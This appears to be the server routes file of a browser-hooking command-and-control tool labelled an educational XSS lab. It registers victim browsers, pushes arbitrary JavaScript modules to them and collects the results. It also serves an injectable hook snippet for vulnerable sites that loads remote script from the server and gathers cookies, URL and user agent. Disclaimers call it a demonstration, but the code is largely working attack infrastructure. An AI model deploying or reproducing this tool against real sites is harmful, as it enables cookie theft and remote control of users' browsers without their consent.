import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { v4 as uuidv4 } from "uuid";
import path from "path";
import fs from "fs";
import { WebSocketServer, WebSocket } from "ws";
import { z } from "zod";
import { hook } from "./hook";
import { executeCommand } from "./commands";
import { insertHookedBrowserSchema, insertCommandExecutionSchema, insertLogSchema, insertCommandModuleSchema } from "@shared/schema";

export async function registerRoutes(app: Express): Promise<Server> {
  const httpServer = createServer(app);
  
  // Setup WebSocket server for real-time communication
  // Use a different path for our WebSocket to avoid conflicts with Vite
  const wss = new WebSocketServer({ 
    server: httpServer,
    path: "/ws/xss-lab"
  });
  
  wss.on("connection", (ws: WebSocket) => {
    // Handle WebSocket connections
    ws.on("message", async (message: Buffer) => {
      try {
        const data = JSON.parse(message.toString());
        
        // Handle different message types
        if (data.type === "browser_update") {
          // Update browser status and broadcast to all clients
          const browser = await storage.getHookedBrowserBySessionId(data.sessionId);
          if (browser) {
            await storage.updateHookedBrowser(browser.id, { 
              isOnline: true,
              lastSeen: new Date()
            });
            
            // Broadcast the update to all connected dashboard clients
            const browsers = await storage.listHookedBrowsers();
            wss.clients.forEach((client: WebSocket) => {
              if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({
                  type: "browser_update",
                  browsers
                }));
              }
            });
          }
        } 
        else if (data.type === "command_result") {
          // Save command result from hooked browser
          if (data.sessionId && data.executionId && data.result) {
            const browser = await storage.getHookedBrowserBySessionId(data.sessionId);
            if (browser) {
              const execution = await storage.getCommandExecution(data.executionId);
              if (execution) {
                await storage.updateCommandExecution(execution.id, {
                  result: data.result,
                  status: "completed"
                });
                
                // Create log entry
                await storage.createLog({
                  browserId: browser.id,
                  event: "command_completed",
                  details: { executionId: execution.id, moduleId: execution.moduleId },
                  level: "info"
                });
                
                // Broadcast the update to all connected dashboard clients
                wss.clients.forEach((client: WebSocket) => {
                  if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify({
                      type: "command_completed",
                      execution: {
                        ...execution,
                        result: data.result,
                        status: "completed"
                      }
                    }));
                  }
                });
              }
            }
          }
        }
      } catch (err) {
        console.error("WebSocket message error:", err);
      }
    });
  });

  // API Routes
  app.get("/api/hooks/count", async (_req: Request, res: Response) => {
    try {
      const browsers = await storage.listHookedBrowsers();
      const activeCount = browsers.filter(b => b.isOnline).length;
      
      res.json({ 
        total: browsers.length,
        active: activeCount,
        inactive: browsers.length - activeCount
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to get hook count" });
    }
  });

  app.get("/api/browsers", async (_req: Request, res: Response) => {
    try {
      const browsers = await storage.listHookedBrowsers();
      res.json(browsers);
    } catch (error) {
      res.status(500).json({ message: "Failed to get hooked browsers" });
    }
  });

  app.get("/api/browsers/:id", async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id);
      const browser = await storage.getHookedBrowser(id);
      
      if (!browser) {
        return res.status(404).json({ message: "Browser not found" });
      }
      
      res.json(browser);
    } catch (error) {
      res.status(500).json({ message: "Failed to get browser details" });
    }
  });

  app.delete("/api/browsers/:id", async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id);
      const deleted = await storage.deleteHookedBrowser(id);
      
      if (!deleted) {
        return res.status(404).json({ message: "Browser not found" });
      }
      
      res.json({ success: true });
      
      // Broadcast the update to all connected dashboard clients
      const browsers = await storage.listHookedBrowsers();
      wss.clients.forEach((client: WebSocket) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            type: "browsers_updated",
            browsers
          }));
        }
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to delete browser" });
    }
  });

  app.get("/api/commands", async (_req: Request, res: Response) => {
    try {
      const commands = await storage.listCommandModules();
      res.json(commands);
    } catch (error) {
      res.status(500).json({ message: "Failed to get command modules" });
    }
  });

  app.get("/api/commands/categories", async (_req: Request, res: Response) => {
    try {
      const commands = await storage.listCommandModules();
      const uniqueCategories = new Set(commands.map(cmd => cmd.category));
      const categories = Array.from(uniqueCategories);
      const categoriesWithCounts = categories.map(category => {
        const count = commands.filter(cmd => cmd.category === category).length;
        return { category, count };
      });
      
      res.json(categoriesWithCounts);
    } catch (error) {
      res.status(500).json({ message: "Failed to get command categories" });
    }
  });

  app.get("/api/commands/category/:category", async (req: Request, res: Response) => {
    try {
      const category = req.params.category;
      const commands = await storage.listCommandModulesByCategory(category);
      res.json(commands);
    } catch (error) {
      res.status(500).json({ message: "Failed to get commands by category" });
    }
  });

  app.get("/api/commands/:id", async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id);
      const command = await storage.getCommandModule(id);
      
      if (!command) {
        return res.status(404).json({ message: "Command module not found" });
      }
      
      res.json(command);
    } catch (error) {
      res.status(500).json({ message: "Failed to get command module" });
    }
  });

  app.post("/api/commands", async (req: Request, res: Response) => {
    try {
      const validatedData = insertCommandModuleSchema.parse(req.body);
      const command = await storage.createCommandModule(validatedData);
      res.status(201).json(command);
    } catch (error) {
      res.status(400).json({ message: "Invalid command module data" });
    }
  });

  app.post("/api/execute", async (req: Request, res: Response) => {
    try {
      const schema = z.object({
        browserId: z.number(),
        moduleId: z.number()
      });
      
      const { browserId, moduleId } = schema.parse(req.body);
      
      const browser = await storage.getHookedBrowser(browserId);
      if (!browser) {
        return res.status(404).json({ message: "Browser not found" });
      }
      
      const module = await storage.getCommandModule(moduleId);
      if (!module) {
        return res.status(404).json({ message: "Command module not found" });
      }
      
      // Create command execution record
      const execution = await storage.createCommandExecution({
        browserId,
        moduleId,
        result: null,
        status: "pending"
      });
      
      // Create log entry
      await storage.createLog({
        browserId,
        event: "command_sent",
        details: { executionId: execution.id, moduleId },
        level: "info"
      });
      
      // Broadcast command to the specific hooked browser via WebSocket
      wss.clients.forEach((client: WebSocket) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            type: "execute_command",
            sessionId: browser.sessionId,
            executionId: execution.id,
            command: module.code
          }));
        }
      });
      
      res.status(200).json({ 
        success: true, 
        execution
      });
    } catch (error) {
      res.status(400).json({ message: "Invalid execution request" });
    }
  });

  app.get("/api/executions", async (_req: Request, res: Response) => {
    try {
      const executions = await storage.listCommandExecutions();
      res.json(executions);
    } catch (error) {
      res.status(500).json({ message: "Failed to get command executions" });
    }
  });

  app.get("/api/executions/browser/:id", async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id);
      const executions = await storage.listCommandExecutionsByBrowser(id);
      res.json(executions);
    } catch (error) {
      res.status(500).json({ message: "Failed to get executions for browser" });
    }
  });

  app.get("/api/logs", async (_req: Request, res: Response) => {
    try {
      const logs = await storage.listLogs();
      res.json(logs);
    } catch (error) {
      res.status(500).json({ message: "Failed to get logs" });
    }
  });

  app.get("/api/logs/browser/:id", async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id);
      const logs = await storage.listLogsByBrowser(id);
      res.json(logs);
    } catch (error) {
      res.status(500).json({ message: "Failed to get logs for browser" });
    }
  });

  app.post("/api/logs", async (req: Request, res: Response) => {
    try {
      const validatedData = insertLogSchema.parse(req.body);
      const log = await storage.createLog(validatedData);
      res.status(201).json(log);
    } catch (error) {
      res.status(400).json({ message: "Invalid log data" });
    }
  });

  // Hook endpoint - this is what hooked browsers will connect to
  app.get("/hook.js", (_req: Request, res: Response) => {
    res.type('application/javascript');
    res.send(hook);
  });

  // Register a new hooked browser
  app.post("/api/hook", async (req: Request, res: Response) => {
    try {
      // Generate a session ID for the hooked browser
      const sessionId = uuidv4();
      
      // Parse and validate the request data
      const browserData = {
        sessionId,
        ipAddress: req.ip || req.socket.remoteAddress || "unknown",
        userAgent: req.headers["user-agent"] || "unknown",
        ...req.body
      };
      
      const validatedData = insertHookedBrowserSchema.parse(browserData);
      
      // Check if this browser is already hooked with the same user agent and IP
      const existingBrowsers = await storage.listHookedBrowsers();
      const existingBrowser = existingBrowsers.find(
        b => b.ipAddress === validatedData.ipAddress && b.userAgent === validatedData.userAgent
      );
      
      let hookedBrowser;
      
      if (existingBrowser) {
        // Update the existing browser with a new session ID and mark as online
        hookedBrowser = await storage.updateHookedBrowser(existingBrowser.id, { 
          isOnline: true,
          lastSeen: new Date(),
          ...validatedData
        });
      } else {
        // Create a new hooked browser record
        hookedBrowser = await storage.createHookedBrowser(validatedData);
      }
      
      // Notify all connected WebSocket clients about the new hook
      wss.clients.forEach((client: WebSocket) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            type: "new_hook",
            browser: hookedBrowser
          }));
        }
      });
      
      // Return the session ID to the hooked browser
      res.json({ 
        success: true, 
        sessionId,
        hookInterval: 5000, // Polling interval in milliseconds
        hookUrl: "/api/hook-update",
        commands: [] // Initial empty command list
      });
    } catch (error) {
      console.error("Hook registration error:", error);
      res.status(400).json({ 
        success: false, 
        message: "Invalid hook data" 
      });
    }
  });

  // Update hook status (heartbeat)
  app.post("/api/hook-update", async (req: Request, res: Response) => {
    try {
      const { sessionId } = req.body;
      
      if (!sessionId) {
        return res.status(400).json({ success: false, message: "Session ID required" });
      }
      
      // Find the hooked browser by session ID
      const browser = await storage.getHookedBrowserBySessionId(sessionId);
      
      if (!browser) {
        return res.status(404).json({ success: false, message: "Browser not found" });
      }
      
      // Update the last seen timestamp
      await storage.updateHookedBrowser(browser.id, { 
        isOnline: true,
        lastSeen: new Date() 
      });
      
      // Get any pending commands for this browser
      const executions = await storage.listCommandExecutionsByBrowser(browser.id);
      const pendingExecutions = executions.filter(e => e.status === "pending");
      
      const commands = [];
      
      // Prepare commands to send to the hooked browser
      for (const execution of pendingExecutions) {
        const module = await storage.getCommandModule(execution.moduleId);
        if (module) {
          commands.push({
            executionId: execution.id,
            code: module.code
          });
        }
      }
      
      // Send back any commands that need to be executed
      res.json({
        success: true,
        commands
      });
    } catch (error) {
      console.error("Hook update error:", error);
      res.status(500).json({ 
        success: false, 
        message: "Failed to update hook status" 
      });
    }
  });

  // Command result submission
  app.post("/api/command-result", async (req: Request, res: Response) => {
    try {
      const { sessionId, executionId, result } = req.body;
      
      if (!sessionId || !executionId) {
        return res.status(400).json({ success: false, message: "Session ID and execution ID required" });
      }
      
      // Find the hooked browser by session ID
      const browser = await storage.getHookedBrowserBySessionId(sessionId);
      
      if (!browser) {
        return res.status(404).json({ success: false, message: "Browser not found" });
      }
      
      // Get the execution record
      const execution = await storage.getCommandExecution(parseInt(executionId));
      
      if (!execution || execution.browserId !== browser.id) {
        return res.status(404).json({ success: false, message: "Execution not found" });
      }
      
      // Update the execution with the result
      await storage.updateCommandExecution(execution.id, {
        result,
        status: "completed"
      });
      
      // Create log entry
      await storage.createLog({
        browserId: browser.id,
        event: "command_completed",
        details: { executionId: execution.id, moduleId: execution.moduleId },
        level: "info"
      });
      
      // Notify all connected WebSocket clients about the command result
      wss.clients.forEach((client: WebSocket) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            type: "command_completed",
            execution: {
              ...execution,
              result,
              status: "completed"
            }
          }));
        }
      });
      
      res.json({
        success: true
      });
    } catch (error) {
      console.error("Command result submission error:", error);
      res.status(500).json({ 
        success: false, 
        message: "Failed to process command result" 
      });
    }
  });

  // Get JavaScript hook code for use in vulnerable sites
  app.get("/api/hookjs", (_req: Request, res: Response) => {
    res.json({
      code: `
// Educational XSS Hook Example - For demonstration only
// IMPORTANT: Using this on systems without permission is illegal

(function() {
  var hook = {
    url: '${process.env.RENDER_EXTERNAL_URL || process.env.REPLIT_DOMAINS?.split(',')[0] || 'http://localhost:5000'}/hook.js',
    init: function() {
      var script = document.createElement('script');
      script.src = this.url;
      script.setAttribute('data-demo', 'true');
      document.head.appendChild(script);
      this.sendInfo();
    },
    sendInfo: function() {
      var data = {
        url: window.location.href,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        screenSize: {
          width: screen.width,
          height: screen.height
        },
        timestamp: new Date().toISOString()
      };
      
      // In a real implementation, this would send data to the hook server
      console.log('Educational demo only - Data that would be sent:', data);
    }
  };
  
  hook.init();
})();`
    });
  });

  return httpServer;
}
